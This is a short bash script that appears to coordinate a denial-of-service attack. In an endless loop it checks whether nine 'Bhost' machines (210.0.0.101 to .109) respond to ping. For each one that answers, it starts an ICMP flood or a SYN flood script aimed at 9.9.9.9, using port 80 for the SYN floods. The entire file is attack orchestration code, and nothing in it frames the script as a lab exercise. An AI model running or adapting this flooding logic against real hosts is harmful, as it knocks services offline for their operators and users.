while true; do
	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
	then
			echo "Bhost 1 found - ICMP attack"
			sh icmp/flooder_simple.sh 9.9.9.9 & 
	fi
	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
	then
			echo "Bhost 2 found - ICMP attack"
			sh icmp/flooder_simple.sh 9.9.9.9 &
	fi

	if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
	then
			echo "Bhost 3 found - ICMP attack"
			sh icmp/flooder_simple.sh 9.9.9.9 &
	fi
	if (( ping 210.0.0.104 -c 1 | grep -q 'from'))
	then
			echo "Bhost 4 found - ICMP attack"
			sh icmp/flooder_simple.sh 9.9.9.9 &
	fi
	if (( ping 210.0.0.105 -c 1 | grep -q 'from'))
	then
			echo "Bhost 5 found - SYN attack"
			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
	fi
	if (( ping 210.0.0.106 -c 1 | grep -q 'from'))
	then
			echo "Bhost 6 found - SYN attack"
			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
	fi
	if (( ping 210.0.0.107 -c 1 | grep -q 'from'))
	then
			echo "Bhost 7 found - SYN attack"
			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
	fi
	if (( ping 210.0.0.108 -c 1 | grep -q 'from'))
	then
			echo "Bhost 8 found - SYN attack"
			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
	fi

	if (( ping 210.0.0.109 -c 1 | grep -q 'from'))
	then
			echo "Bhost 9 found - SYN attack"
			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
	fi
done
